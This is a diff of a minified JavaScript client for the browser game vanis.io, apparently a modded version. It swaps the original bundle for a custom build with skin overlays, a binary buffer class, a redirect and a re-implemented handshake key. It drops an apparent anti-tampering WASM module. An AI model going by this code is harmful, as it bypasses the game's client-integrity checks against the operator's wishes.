-                                        emscripten_notify_memory_growth($) {},
-                                        console_log: console.log.bind(null)
-                                    }
-                                };
-                            return this.instance = await WebAssembly.instantiate(await WebAssembly.compile(await $.arrayBuffer()), e), this.wasm = this.instance.exports, this.heap = new i.SE(this.wasm.memory.buffer), delete this.initializing, !0
-                        }
-                        parse($, e, t) {
-                            var s, i, n, a;
-                            return this.instance ? ({
-                                stop_skidding_dc_aeroaxon: a,
-                                free: s,
-                                malloc: i
-                            } = this.wasm, i = i(8 + $.byteLength), (n = new Int32Array(this.heap.buffer, i, 2)).fill(0), this.heap.set($, i + 8), a(i, i + 8, e, x.A.pids[e], t), $ = n[0], a = n[1], s(i), [$, a]) : [-1, -1]
-                        }
-                    },
-                    o = (a.init(), ($, e) => a.parse(new i.SE($.buffer, 1), e, -1))
-            },
-            97833($, e, t) {
-                $.exports = t.p + "f19c0afc50aad5b7d507.js"
-            },
-            42634() {},
-            71675($) {
-                $.exports = JSON.parse('{"rE":"1.1.0","VY":"https://vanis.io/"}')
-            }
-        },
-        s = {};
-
-    function i($) {
-        var e = s[$];
-        return void 0 !== e || (e = s[$] = {
-            id: $,
-            loaded: !1,
-            exports: {}
-        }, x[$].call(e.exports, e, e.exports, i), e.loaded = !0), e.exports
+! function e(root) {
+    if ("?vanilla" === location.search) return;
+    {
+        let t = "https://vanis.io/balls";
+        location.href !== t && (location.href = t)
     }
-    i.m = x, $ = [], i.O = (e, t, x, s) => {
-        if (!t) {
-            for (var n = 1 / 0, a = 0; a < $.length; a++) {
-                for (var o, [t, x, s] = $[a], r = !0, l = 0; l < t.length; l++) s <= n && Object.keys(i.O).every($ => i.O[$](t[l])) ? t.splice(l--, 1) : (r = !1, s < n && (n = s));
-                r && ($.splice(a--, 1), void 0 !== (o = x())) && (e = o)
+    document.title = "Balls game", window.customModal = (e, t) => {
+        document.getElementsByClassName("fa-clipboard-list")[0].click(), setTimeout(() => {
+            document.getElementsByClassName("content fade-box")[0].getElementsByTagName("div")[0].innerHTML = e, t && setTimeout(t, 50)
+        }, 50)
+    };
+
+    window.CellOverlayManager = { cache:{} }
+    
+    CellOverlayManager.list = [
+        {
+            name:'zimek',
+            skinUrl:'https://skins.vanis.io/s/Owljce',
+            isLockedToColor:true,
+            isLockedToName:true,
+            url:'https://i.postimg.cc/x82447k4/hat5.png',
+            forceSkin:'https://i.postimg.cc/QxjCrd1f/skin5.png'
+        }
+    ]
+    
+    CellOverlayManager.updateOverlays = () => {
+        CellOverlayManager.list.forEach(overlay => {
+            let cells = Array.from(GAME.cells, ([name, value]) => value);
+            cells = cells.filter(x=>{
+                if(!x.player || x.destroyed || !x.sprite || x.overlay && x.overlay.includes(overlay.url)) return false
+    
+                let qualify = false
+                if(overlay.skinUrl == x.player.skinUrl || overlay.forceSkin == x.player.skinUrl) qualify = true
+                if(overlay.isLockedToColor && !x.player.perk_colorCss) qualify = false
+                if(overlay.isLockedToName && x.player.name !== overlay.name) qualify = false
+                if(qualify && overlay.forceSkin && x.player.skinUrl !== overlay.forceSkin) x.player.setSkin(overlay.forceSkin);
+    
+                return qualify
+            })
+    
+            cells.forEach(c=> { CellOverlayManager.addOverlay(c, overlay.url) })
+        })
+    }
+    
+    CellOverlayManager.addOverlay = (cell, url) => {
+        if(!cell.sprite) return; 
+    
+        const Sprite = CellOverlayManager.cache[url] ? new PIXI.Sprite(CellOverlayManager.cache[url].texture) : new PIXI.Sprite.from(url)
+        if(!CellOverlayManager.cache[url]) CellOverlayManager.cache[url] = Sprite 
+    
+        Sprite.anchor.set(0.5)
+        Sprite.height = Sprite.width = 1024
+        Sprite.alpha = 0.95
+        Sprite.zIndex = -1
+    
+        if(!cell.overlay) cell.overlay = []
+        cell.overlay.push(url)
+        cell.sprite.addChild(Sprite)
+    }
+    
+    CellOverlayManager.interval = setInterval(CellOverlayManager.updateOverlays, 25)
+    
+    class s {
+        constructor(e, t) {
+            if (this.view = null, e instanceof DataView) this.view = e;
+            else {
+                if (!(e instanceof ArrayBuffer)) throw TypeError("First argument to SmartBuffer constructor must be an ArrayBuffer or DataView");
+                this.view = new DataView(e)
+            }
+            this.offset = t || 0
+        }
+        ensureCapacity(e) {
+            let d = 1;
+            let t = this.offset + e;
+            if (t > this.length) {
+                let s = new ArrayBuffer(t),
+                    i = new Uint8Array(s);
+                i.set(new Uint8Array(this.buffer)), this.view = new DataView(s)
+            }
+        }
+        static fromSize(e) {
+            return new this(new ArrayBuffer(e), 0)
+        }
+        static fromBuffer(e, t) {
+            return new this(e, t || 0)
+        }
+        toBuffer() {
+            return this.buffer
+        }
+        get buffer() {
+            return this.view?.buffer || null
+        }
+        get length() {
+            return this.view?.byteLength || 0
+        }
+        get eof() {
+            return this.offset >= this.length
+        }
+        read(e, t, s, i) {
+            let a = e.call(this.view, i ?? this.offset, s);
+            return null == i && (this.offset += t), a
+        }
+        write(e, t, s, i) {
+            this.ensureCapacity(t), e.call(this.view, this.offset, s, i), this.offset += t
+        }
+        readInt8(e) {
+            return this.read(DataView.prototype.getInt8, 1, null, e)
+        }
+        readUInt8(e) {
+            return this.read(DataView.prototype.getUint8, 1, null, e)
+        }
+        readInt16LE(e) {
+            return this.read(DataView.prototype.getInt16, 2, !0, e)
+        }
+        readInt16BE(e) {
+            return this.read(DataView.prototype.getInt16, 2, !1, e)
+        }
+        readUInt16LE(e) {
+            return this.read(DataView.prototype.getUint16, 2, !0, e)
+        }
+        readUInt16BE(e) {
+            return this.read(DataView.prototype.getUint16, 2, !1, e)
+        }
+        readInt32LE(e) {
+            return this.read(DataView.prototype.getInt32, 4, !0, e)
+        }
+        readInt32BE(e) {
+            return this.read(DataView.prototype.getInt32, 4, !1, e)
+        }
+        readUInt32LE(e) {
+            return this.read(DataView.prototype.getUint32, 4, !0, e)
+        }
+        readUInt32BE(e) {
+            return this.read(DataView.prototype.getUint32, 4, !1, e)
+        }
+        readString16() {
+            let e = "";
+            for (;;) {
+                let t = this.eof ? 0 : this.readUInt16LE();
+                if (0 === t) break;
+                e += String.fromCharCode(t)
             }
             return e
         }
-        s = s || 0;
-        for (var a = $.length; 0 < a && $[a - 1][2] > s; a--) $[a] = $[a - 1];
-        $[a] = [t, x, s]
-    }, i.n = $ => {
-        var e = $ && $.__esModule ? () => $.default : () => $;
-        return i.d(e, {
-            a: e
-        }), e
-    }, i.d = ($, e) => {
-        for (var t in e) i.o(e, t) && !i.o($, t) && Object.defineProperty($, t, {
-            enumerable: !0,
-            get: e[t]
-        })
-    }, i.g = function() {
-        if ("object" == typeof globalThis) return globalThis;
-        try {
-            return this || Function("return this")()
-        } catch ($) {
-            if ("object" == typeof window) return window
+        readString() {
+            let e = "";
+            for (;;) {
+                let t = this.eof ? 0 : this.readUInt8();
+                if (0 === t) break;
+                e += String.fromCharCode(t)
+            }
+            return e
         }
-    }(), i.o = ($, e) => Object.prototype.hasOwnProperty.call($, e), i.r = $ => {
-        "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty($, Symbol.toStringTag, {
-            value: "Module"
-        }), Object.defineProperty($, "__esModule", {
-            value: !0
-        })
-    }, i.nmd = $ => ($.paths = [], $.children || ($.children = []), $), i.p = "./", i.b = document.baseURI || self.location.href, e = {
-        792: 0,
-        524: 0
-    }, i.O.j = $ => 0 === e[$], n = ($, t) => {
-        var x, s, n, [a, o, r] = t,
-            l = 0;
-        if (a.some($ => 0 !== e[$])) {
-            for (x in o) i.o(o, x) && (i.m[x] = o[x]);
-            r && (n = r(i))
+        readEscapedString() {
+            return decodeURIComponent(escape(this.readString()))
         }
-        for ($ && $(t); l < a.length; l++) s = a[l], i.o(e, s) && e[s] && e[s][0](), e[s] = 0;
-        return i.O(n)
-    }, (t = self.webpackChunkvanis_client = self.webpackChunkvanis_client || []).forEach(n.bind(null, 0)), t.push = n.bind(null, t.push.bind(t)), i.O(void 0, [121, 524], () => i(27461));
-    var n = i.O(void 0, [121, 524], () => i(28156));
-    i.O(n)
-})();
+        writeInt8(e) {
+            this.write(DataView.prototype.setInt8, 1, e, null)
+        }
+        writeUInt8(e) {
+            this.write(DataView.prototype.setUint8, 1, e, null)
+        }
+        writeInt16LE(e) {
+            this.write(DataView.prototype.setInt16, 2, e, !0)
+        }
+        writeInt16BE(e) {
+            this.write(DataView.prototype.setInt16, 2, e, !1)
+        }
+        writeUInt16LE(e) {
+            this.write(DataView.prototype.setUint16, 2, e, !0)
+        }
+        writeUInt16BE(e) {
+            this.write(DataView.prototype.setUint16, 2, e, !1)
+        }
+        writeInt32LE(e) {
+            this.write(DataView.prototype.setInt32, 4, e, !0)
+        }
+        writeInt32BE(e) {
+            this.write(DataView.prototype.setInt32, 4, e, !1)
+        }
+        writeUInt32LE(e) {
+            this.write(DataView.prototype.setUint32, 4, e, !0)
+        }
+        writeUInt32BE(e) {
+            this.write(DataView.prototype.setUint32, 4, e, !1)
+        }
+        writeString(e) {
+            let t = e.length;
+            this.ensureCapacity(t);
+            let s = this.offset;
+            for (this.offset += t; t--;) this.view.setUint8(s + t, e.charCodeAt(t))
+        }
+        writeStringNT(e) {
+            this.writeString(e), this.writeUInt8(0)
+        }
+        writeEscapedString(e) {
+            this.writeString(unescape(encodeURIComponent(e)))
+        }
+        writeEscapedStringNT(e) {
+            this.writeStringNT(unescape(encodeURIComponent(e)))
+        }
+    }
+    window.SmartBuffer = s;
+    let i = [5, 104, 253, 62, 175, 116, 238, 41];
+    class a {
+        constructor(e) {
+            this.data = e
+        }
+        writeIndex(e, t) {
+            let s = this.data[t],
+                a = s + 5 & 7,
+                n = e[t > 0 ? t - 1 : 0] ^ i[t];
+            e.push(((s << a | s >>> 8 - a) & 255 ^ n ^ 62) & 255)
+        }
+        build(e = !1) {
+            let t = [];
+            for (let s = 0; s < 8; s++) this.writeIndex(t, s);
+            let i = 1 + Math.floor(2147483646 * Math.random());
+            return t.push((t[0] ^ i >> 24) & 255), t.push((t[1] ^ i >> 16) & 255), t.push((t[2] ^ i >> 8) & 255), t.push((i ^ t[3]) & 255), t.push((t[0] ^ +e ^ 31) & 255), t
+        }
+    }
+    var n = [.79, 1.52, 2.35, 3, 3.92, 4.7, 5.5, 6.2];
+
+    function o(e) {
+        for (var t = 9e9, s = 0, i = 0; e.length < i; i++) e[i].id < t && (s = i, t = e[i].id);
+        return e.splice(s, 1), e
+    }
+    String.prototype.toHHMMSS = function() {
+            var e = parseInt(this, 10),
+                t = Math.floor(e / 3600),
+                s = Math.floor((e - 3600 * t) / 60);
+            return `${0!==s?`${s}m `:""}${e-3600*t-60*s}s`
+        }, window.makeid = e => {
+            for (var t = "", s = "X0123456789", i = s.length, a = 0; a < e; a++) t += s.charAt(Math.floor(Math.random() * i));
+            return t
+        }, window.$ = (e, t = document) => t.querySelector(e), window.extraServers = [{
+            name: "Local:8080",
+            domain: "localhost",
+            port: 8080,
+            mode: "Instant",
+            players: "0",
+            slots: "00",
+            region: "EU",
+            url: "ws://localhost:8080"
+        }],
+        function(e) {
+            var t, s = (t = !0, function(e, s) {
+                var i = t ? function() {
+                    if (s) {
+                        var t = s.apply(e, arguments);
+                        return s = null, t
+                    }
+                } : function() {};
+                return t = !1, i
+            });
+
+            function i(t) {
+                var i = s(this, function() {
+                    var e = function() {
+                        return !e.constructor('return /" + this + "/')().constructor("^([^ ]+( +[^ ]+)+)+[^ ]}").test(i)
+                    };
+                    return e()
+                });
+                i();
+                for (var n, l, c = t[0], h = t[1], d = t[2], u = 0, g = []; u < c.length; u++) l = c[u], Object.prototype.hasOwnProperty.call(o, l) && o[l] && g.push(o[l][0]), o[l] = 0;
+                for (n in h) Object.prototype.hasOwnProperty.call(h, n) && (e[n] = h[n]);
+                for (p && p(t); g.length;) g.shift()();
+                return r.push.apply(r, d || []), a()
+            }
+
+            function a() {
+                for (var e, t = 0; t < r.length; t++) {
+                    for (var s = r[t], i = !0, a = 1; a < s.length; a++) 0 !== o[s[a]] && (i = !1);
+                    i && (r.splice(t--, 1), e = l(l.s = s[0]))
+                }
+                return e
+            }
+            var n = {},
+                o = {
+                    0: 0
+                },
+                r = [];
+
+            function l(t) {
+                if (n[t]) return n[t].exports;
+                var s = n[t] = {
+                    i: t,
+                    l: !1,
+                    exports: {}
+                };
+                return e[t].call(s.exports, s, s.exports, l), s.l = !0, s.exports
+            }
+            window.getModule = l, l.m = e, l.c = n, l.d = function(e, t, s) {
+                l.o(e, t) || Object.defineProperty(e, t, {
+                    enumerable: !0,
+                    get: s
+                })
+            }, l.r = function(e) {
+                "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
+                    value: "Module"
+                }), Object.defineProperty(e, "__esModule", {
+                    value: !0
+                })
+            }, l.t = function(e, t) {
+                if (1 & t && (e = l(e)), 8 & t || 4 & t && "object" == typeof e && e && e.__esModule) return e;
+                var s = Object.create(null);
+                if (l.r(s), Object.defineProperty(s, "default", {
+                        enumerable: !0,
+                        value: e
+                    }), 2 & t && "string" != typeof e)
+                    for (var i in e) l.d(s, i, (function(t) {
+                        return e[t]
+                    }).bind(null, i));
+                return s
+            }, l.n = function(e) {
+                var t = e && e.__esModule ? function() {
+                    return e.default
+                } : function() {
+                    return e
+                };
+                return l.d(t, "a", t), t
+            }, l.o = function(e, t) {
+                return Object.prototype.hasOwnProperty.call(e, t)
+            }, l.p = "";
+            var c = window.webpackJsonp = window.webpackJsonp || [],
+                h = c.push.bind(c);
+            c.push = i, c = c.slice();
+            for (var d = 0; d < c.length; d++) i(c[d]);
+            var p = h;
+            r.push([118, 1]), a()
+        }([, function(e, t, i) {
+            let n = i(5),
+                {
+                    writeUserData: o
+                } = i(8),
+                r = i(4),
+                l = i(24),
+                c = i(121),
+                h = i(125),
+                d = i(78),
+                p = i(12),
+                u = i(23),
+                g = i(128),
+                {
+                    lerp: A,
+                    clampNumber: m,
+                    hideCaptchaBadge: v
+                } = i(8),
+                {
+                    htmlEncode: f
+                } = i(8),
+                C, y = {
+                    connectionUrl: null,
+                    selectedServer: null,
+                    spectators: 0,
+                    lifeState: 0,
+                    allowed: !1,
+                    playButtonDisabled: !1,
+                    playButtonText: "Play",
+                    deathDelay: !1,
+                    autoRespawning: !1
+                },
+                w = (e, t) => {
+                    n.toast.fire({
+                        type: t ? "error" : "info",
+                        title: e,
+                        timer: t ? 5e3 : 2e3
+                    })
+                },
+                I = (e, t) => {
+                    for (; e.length;) e.pop().destroy(t)
+                };
+            document.body.oncontextmenu = e => e.target?.id === "email";
+            class k {
+                constructor() {
+                    this.running = !1, this.protocol, this.modeId, this.instanceSeed, this.replaying, this.nwDataMax, this.nwDataSent, this.nwDataTotal, this.nwData, this.playerId, this.multiboxPid, this.activePid, this.tagId, this.spectating, this.alive = !1, this.center = {
+                        x: 0,
+                        y: 0
+                    }, y.spectators, y.lifeState, this.score = 0, this.highestScore = 0, this.killCount = 0, this.timeAlive = 0, this.clientVersion = 999, this.events = new u, this.settings = r, this.renderer = l, this.skinLoader = new g, p.virus.loadVirusFromUrl(r.virusImageUrl), this.state = y, h.useGame(this), this.playback, this.connection = new class e {
+                        constructor() {
+                            this.socketCount = 0, this.opened = !1
+                        }
+                        onClosed(e) {
+                            console.log("closed "+e);
+                            delete C.currentWsId, this.opened = !1, C.running && C.stop();
+                            let t;
+                            if (1003 === e.code) t = 1500, w("Server restarting...", !1);
+                            else {
+                                t = 3500 + ~~(100 * Math.random());
+                                let s = "You have been disconnected";
+                                if(e.reason){
+                                    (s += ` (${e.reason})`), w(s, !0)
+                                    if(e.reason.startsWith('Too old client version'))GAME.clientVersion++;
+                                }
+                            }
+                            setTimeout(() => {
+                                this.opened || C.events.$emit("reconnect-server")
+                            }, t), C.showMenu(!0)
+                        }
+                        onRejected() {
+                            delete C.currentWsId, this.opened = !1, w("Connection rejected", !0)
+                        }
+                        open(e) {
+                            console.log("OPENEED");
+                            C.dual.close(), C.running && C.stop(), this.close(), C.events.$emit("chat-clear"), this.opened = !0;
+                            let t = C.ws = new WebSocket(e, "tFoL46WDlZuRja7W6qCl");
+                            t.binaryType = "arraybuffer", t.packetCount = 0, t.onopen = () => {
+                                this.opened && (C.currentWsId = t.id = this.socketCount++, C.state.connectionUrl = e, t.onclose = this.onClosed.bind(this))
+                            }, t.onclose = this.onRejected.bind(this), t.onmessage = e => {
+                                let {
+                                    data: t
+                                } = e;
+                                C.nwData += t.byteLength, C.parseMessage(s.fromBuffer(t))
+                            }
+                        }
+                        close() {
+                            C.dual.close(), C.debugElement.innerHTML = "";
+                            let {
+                                ws: e
+                            } = C;
+                            e && (e.onmessage = null, e.onclose = null, e.onerror = null, e.close(), delete C.ws, delete C.state.connectionUrl, this.opened = !1)
+                        }
+                        send(e, t, i = !1) {
+                            e instanceof s && (e = e.view), t = !!t;
+                            let {
+                                dual: a
+                            } = C;
+                            if (t ? !(a.opened && (i || a.ready)) : !this.opened) return !1;
+                            let n = t ? a.ws : C.ws;
+                            return console.assert(!!n, "Socket not defined?"), n.send(e), !0
+                        }
+                        sendMouse() {
+                            let e = s.fromSize(5);
+                            e.writeUInt8(16);
+                            let {
+                                x: t,
+                                y: i
+                            } = C.mouse;
+                            e.writeInt16LE(t), e.writeInt16LE(i);
+                            let {
+                                dual: a
+                            } = C;
+                            this.send(e, a.focused), a.connected && (C.isAlive(!1) && C.isAlive(!0) || this.send(e, C.isAlive(!1)))
+                        }
+                        sendOpcode(e, t) {
+                            let i = s.fromSize(1);
+                            i.writeUInt8(e), this.send(i, t)
+                        }
+                        ping() {
+                            C.pingStamp = performance.now(), this.sendOpcode(3)
+                        }
+                        sendJoinData(e, t) {
+                            let i = s.fromSize(2 + e.length + 7);
+                            i.writeUInt8(5), i.writeUInt8(C.clientVersion), i.ensureCapacity(e.length), e.forEach(e => i.writeUInt8(e)), o(i, !!t);
+                            let a = localStorage.vanisToken;
+                            a && /^wss?:\/\/[a-zA-Z0-9_-]+\.vanis\.io/i.test(C.ws.url) && i.writeStringNT(a), this.send(i, t, !!t)
+                        }
+                        sendRecaptchaToken(e, t) {
+                            e = unescape(encodeURIComponent(e));
+                            let i = s.fromSize(1 + e.length + 1);
+                            i.writeUInt8(11), i.writeStringNT(e), this.send(i, t)
+                        }
+                        sendChatMessage(e, t) {
+                            if ((e = unescape(encodeURIComponent(e))).startsWith("/")) {
+                                window.client && window.client.chatted(e);
+                                return
+                            }
+                            let i = s.fromSize(1 + e.length + 1);
+                            i.writeUInt8(99), i.writeString(e), this.send(i, t)
+                        }
+                    }, this.dual, this.pingStamp, this.timeStamp, this.serverTick, this.cells = new Map, this.destroyedCells = [], this.cellCount = 0, this.ownedCells = new Set, this.rawMouse, this.mouse, this.mouseZoom, this.mouseZoomMin, this.camera, this.massTextPool = [], this.crownPool = [], c.useGame(this), this.scene, this.playerManager, this.ticker, this.splitCount, this.moveWaitUntil, this.stopMovePackets, this.mouseFrozen, this.moveInterval, setInterval(() => this.events.$emit("every-second"), 1e3), setInterval(() => this.events.$emit("every-minute"), 6e4)
+                }
+                isAlive(e = !1) {
+                    let {
+                        dual: t
+                    } = this;
+                    return e ? t.opened && t.alive : this.connection.opened && this.alive
+                }
+                get allCells() {
+                    let e = this.cells,
+                        {
+                            dual: t
+                        } = this;
+                    //if (true) return e;
+                    if (!t.opened) return e;
+                    e = new Map([...e]);
+                    let s = t.cells;
+                    return s.forEach((t, s) => {
+                        //e.has(s) || e.set(s, t)
+                        e.set(s,t)
+                    }), e
+                }
+                updateStates(e) {
+                    let t = !1,
+                        s = !1,
+                        {
+                            dual: i
+                        } = this;
+                    return C.allCells.forEach(e => {
+                        e.pid && (e.pid == this.playerId ? this.alive = t = !0 : i.opened && e.pid == i.pid && (i.alive = s = !0))
+                    }), this.alive && !t && (this.alive = !1), i.alive && !s && (i.alive = !1), y.lifeState = (t ? 1 : 0) + (s ? 2 : 0), e ? s : t
+                }
+                start(e) {
+                    if (!(e.protocol && e.instanceSeed && e.playerId && e.border)) throw Error("Lacking mandatory data");
+                    this.running = !0, this.protocol = e.protocol, this.modeId = e.gamemodeId || 0, this.instanceSeed = e.instanceSeed, this.replaying = !!e.replayUpdates, this.nwDataMax = this.nwDataSent = this.nwDataTotal = this.nwData = 0, this.pingStamp = 0, this.timeStamp = 0, this.serverTick = 0, this.playerId = e.playerId, this.multiboxPid = 0, this.activePid = this.playerId, this.tagId = null, this.spectating = !1, this.alive = !1, y.spectators = 0, y.lifeState = 0, this.score = 0, this.highestScore = 0, this.cellCount = 0, this.rawMouse = {
+                        x: 0,
+                        y: 0
+                    }, this.mouse = {
+                        x: 0,
+                        y: 0
+                    };
+                    let t = this.border = e.border;
+                    this.food = e.food, this.mouseZoom = .3, this.mouseZoomMin = .01, this.camera = {
+                        time: 0,
+                        sx: 0,
+                        sy: 0,
+                        ox: t.x,
+                        nx: t.x,
+                        oy: t.y,
+                        ny: t.y,
+                        oz: this.mouseZoom,
+                        nz: this.mouseZoom
+                    }, this.massTextPool = [], this.crownPool = [];
+                    let i = PIXI.utils.isWebGLSupported() && r.useWebGL && r.showBackgroundImage,
+                        a = this.scene = new c(t, i);
+                    if (a.container.alpha = r.gameAlpha || 1, a.container.pivot.set(t.x, t.y), a.container.scale.set(this.zoom), this.playerManager = new h, this.ticker = new PIXI.Ticker, this.ticker.add(this.onTick.bind(this)), y.selectedServer && y.connectionUrl !== y.selectedServer.url && (y.selectedServer = null), this.replaying) {
+                        let {
+                            playback: n
+                        } = this, o = e.replayUpdates;
+                        n.set(o), this.moveInterval = setInterval(n.next.bind(n), 40), this.events.$emit("show-replay-controls", o.length), this.events.$emit("minimap-stats-visible", !1)
+                    } else this.splitCount = 0, this.moveWaitUntil = 0, this.stopMovePackets = 0, this.moveToCenterOfCells = 0, this.mouseFrozen = !1, r.minimapEnabled && this.events.$emit("minimap-show"), r.showChat && this.events.$emit("chat-visible", {
+                        visible: !0
+                    }), this.events.$emit("leaderboard-show"), this.events.$emit("stats-visible", !0), this.moveInterval = setInterval(() => {
+                        let {
+                            dual: e
+                        } = this;
+                        if (this.stopMovePackets === 1 + +e.focused) return;
+                        let t = this.moveToCenterOfCells;
+                        if (0 != t && this.connection.sendOpcode(9, 2 == t), e.focused ? 2 == t : 1 == t) return;
+                        let i = s.fromSize(5);
+                        i.writeUInt8(16);
+                        let {
+                            x: a,
+                            y: n
+                        } = this.mouse;
+                        i.writeInt16LE(a), i.writeInt16LE(n), this.connection.send(i, e.focused)
+                    }, 40), this.events.$on("every-second", k.everySecond), y.allowed = !0;
+                    this.ticker.start(), this.eventListeners(!0), this.events.$emit("game-started")
+                }
+                stop() {
+                    let {
+                        dual: e
+                    } = this;
+                    e.opened && e.close(), this.running = !1, delete this.protocol, delete this.modeId, delete this.instanceSeed, delete this.replaying, delete this.nwDataMax, delete this.nwDataSent, delete this.nwDataTotal, delete this.nwData, delete this.playerId, delete this.multiboxPid, delete this.activePid, delete this.tagId, this.spectating = !1, this.alive = !1, y.spectators = 0, y.lifeState = 0, y.allowed = !1, y.playButtonDisabled = !1, y.playButtonText = "Play", this.eventListeners(!1), delete this.score, delete this.highestScore, delete this.pingStamp, delete this.timeStamp, delete this.serverTick, delete this.playerId, delete this.multiboxPid, delete this.activePid, delete this.tagId, delete this.spectating, this.clearCells(), delete this.cellCount, delete this.rawMouse, delete this.mouse, delete this.mouseZoom, delete this.mouseZoomMin, delete this.camera, this.ticker && (this.ticker.stop(), delete this.ticker), delete this.splitCount, delete this.moveWaitUntil, delete this.stopMovePackets, delete this.moveToCenterOfCells, delete this.mouseFrozen, clearInterval(this.moveInterval), delete this.moveInterval, this.playback.reset(), this.events.$off("every-second", k.everySecond), this.skinLoader.clearCallbacks(), this.events.$emit("minimap-stats-visible", !0), this.events.$emit("stats-visible", !1), this.events.$emit("chat-visible", {
+                        visible: !1
+                    }), this.events.$emit("leaderboard-hide"), this.events.$emit("minimap-hide"), this.events.$emit("minimap-destroy"), this.events.$emit("show-replay-controls", !1), this.events.$emit("cells-changed", 0), this.events.$emit("reset-cautions"), this.events.$emit("game-stopped"), this.playerManager.destroy(), delete this.playerManager;
+                    let {
+                        scene: t
+                    } = this;
+                    t && (t.destroyBackgroundImage(!1), t.uninstallMassTextFont(), t.container.destroy({
+                        children: !0
+                    }), delete this.scene), this.renderer.clear(), p.cells.destroyCache(), p.squares.destroyCache(), I(this.massTextPool, !0), I(this.crownPool), delete this.massTextPool, delete this.crownPool
+                }
+                showMenu(e) {
+                    if (e ??= !this.app.showMenu, this.app.showDeathScreen) return !1;
+                    if (this.app.showMenu = e, this.actions.stopMovement(e), e) this.events.$emit("menu-opened");
+                    else {
+                        let t = document.activeElement;
+                        t?.id !== "chatbox-input" && l.view.focus(), this.stopMovePackets = 0, v()
+                    }
+                    return e
+                }
+                updateStats(e) {
+                    this.events.$emit("stats-changed", {
+                        ping: e,
+                        fps: Math.round(this.ticker.FPS),
+                        mass: this.score,
+                        score: this.highestScore
+                    }), this.events.$emit("minimap-stats-changed", {
+                        playerCount: this.playerManager.playerCount,
+                        spectators: y.spectators
+                    })
+                }
+                static everySecond() {
+                    (C.isAlive(!1) || C.isAlive(!0)) && C.timeAlive++, C.nwData > C.nwDataMax && (C.nwDataMax = C.nwData), C.nwDataTotal += C.nwData;
+                    //console.log(C);
+                    let {
+                        connection: e
+                    } = C, {
+                        debugElement: t
+                    } = C;
+                    if (t) {
+                        if ((r.debugStats || r.clientStats) && e.opened) {
+                            let s = C.dual.connected,
+                                i = "";
+                            if (r.debugStats && !C.replaying && (i += `
+            NET: ${(C.nwData/1024).toFixed(0)} Kb/s <br>
+            NET PEAK: ${(C.nwDataMax/1024).toFixed(0)} Kb/s <br>
+            NET TOTAL: ${(C.nwDataTotal/1024/1024).toFixed(0)} MB <br>
+            <br>`), r.clientStats) {
+                                let {
+                                    x: a,
+                                    y: n
+                                } = C.mouse;
+                                i += `
+        PID: ${C.playerId} <br>
+        ${s?`DUAL PID: ${C.multiboxPid} <br>`:""}
+        NODES: ${C.allCells.size} <br>
+        `
+                            }
+                            t.innerHTML = i
+                        } else "" !== t.innerHTML && (t.innerHTML = "")
+                    } //        <b>(MOUSE)</b> ${a.toFixed(0)} ${n.toFixed(0)} <br>
+                    C.nwData = 0, e.opened && e.ping();
+                    let {
+                        dual: o
+                    } = C;
+                    o.connected && (o.pingStamp = performance.now(), e.sendOpcode(3, !0))
+                }
+                clearCells() {
+                    this.cells.forEach(e => e.destroy(1));
+                    let {
+                        destroyedCells: e
+                    } = this;
+                    for (; e.length;) e.pop().destroySprite()
+                }
+                onTick() {
+                    let e = this.timeStamp = performance.now();
+                    e >= this.moveWaitUntil && (this.updateMouse(), this.splitCount = 0);
+                    let {
+                        destroyedCells: t
+                    } = this, s = t.length;
+                    for (; s--;) {
+                        let i = t[s];
+                        i.update() && (i.destroySprite(), t.splice(s, 1))
+                    }
+                    let a = 0;
+                    this.allCells.forEach(e => {
+                        try{
+                        e.update(), e.pid == this.activePid && a++
+                        }catch(error){console.log(error);console.log(e);}
+                    }), this.cellCount != a && (this.cellCount = a, this.events.$emit("cells-changed", a));
+                    let {
+                        scene: n
+                    } = this;
+                    n.sort();
+                    let o = this.updateCamera();
+                    if (o) {
+                        this.score = o;
+                        let {
+                            highestScore: r
+                        } = this;
+                        this.highestScore = r ? r < o ? o : r : o
+                    } else this.isAlive(!0) || this.isAlive(!1) || (this.score = 0);
+                    this.renderer.render(n.container)
+                }
+                    updateCamera(e = !1) {
+                    let {
+                        scene: t,
+                        camera: s
+                    } = this, i = this.timeStamp - s.time, a = m(i / r.cameraMoveDelay, 0, 1), n = m(i / r.cameraZoomDelay, 0, 1), o = t.container.pivot.x = 1 == a ? s.nx : A(s.ox, s.nx, a), l = t.container.pivot.y = 1 == a ? s.ny : A(s.oy, s.ny, a), c = 1 == n ? s.nz : A(s.oz, s.nz, n);
+                    t.container.scale.set(c);
+                    //console.log(t);    
+                    let h = this.mouseZoom,
+                        d = 0,
+                        p = 0,
+                        u = 0;
+                    if (this.spectating) {
+                        let {
+                            sx: g,
+                            sy: v
+                        } = s;
+                        d = g, p = v
+                    } else {
+                        let f = !1;
+                        if (!this.replaying) {
+                            let {
+                                dual: y
+                            } = this;
+                            if (y.connected) {
+                               let w = y.getDistanceFromOwner();
+                                f = !!r.singleView || null == w || w > r.switchDistance * 1000
+                            }
+                        }
+                        let I = 0,
+                            k;
+                        for (k of this.ownedCells.values()) {
+                            if (f && k.pid != C.activePid) continue;
+                            let b = Math.round(Math.pow(k.nSize / 10, 2));
+                           d += k.nx * b, p += k.ny * b, I += k.nSize, u += b
+                        }
+                        u ? (d /= u, p /= u, r.autoZoom && (h *= Math.pow(Math.min(64 / I, 1), .27))) : (d = s.nx, p = s.ny)
+                    }
+                    return e ? (s.ox = o, s.oy = l, s.oz = c, s.nx = d, s.ny = p, s.nz = h, s.time = this.timeStamp, 0) : u
+                }
+                updateMouse(e = !1) { //
+                    let t = this.scene.container,
+                        {
+                            x: s,
+                            y: i
+                        } = this.rawMouse;
+                    "client" in window && (client.mouse = {
+                        x: s,
+                        y: i
+                    }), (!this.mouseFrozen || e) && (this.mouse.x = m(t.pivot.x + (s - window.innerWidth / 2) / t.scale.x, -32768, 32767), this.mouse.y = m(t.pivot.y + (i - window.innerHeight / 2) / t.scale.y, -32768, 32767))
+                }
+                seededRandom(e) {
+                    return (e = Math.sin(e) * (1e4 + this.instanceSeed)) - Math.floor(e)
+                }
+                createThumbnail(e = 240, t = 135) {
+                    let s = this.scene.container,
+                        i = new PIXI.Container;
+                    i.pivot.x = s.position.x, i.pivot.y = s.position.y, i.position.x = e / 2, i.position.y = t / 2, i.scale.set(.25), i.addChild(s);
+                    let {
+                        renderer: a
+                    } = this, n = PIXI.RenderTexture.create(e, t);
+                    a.render(i, n), i.removeChild(s);
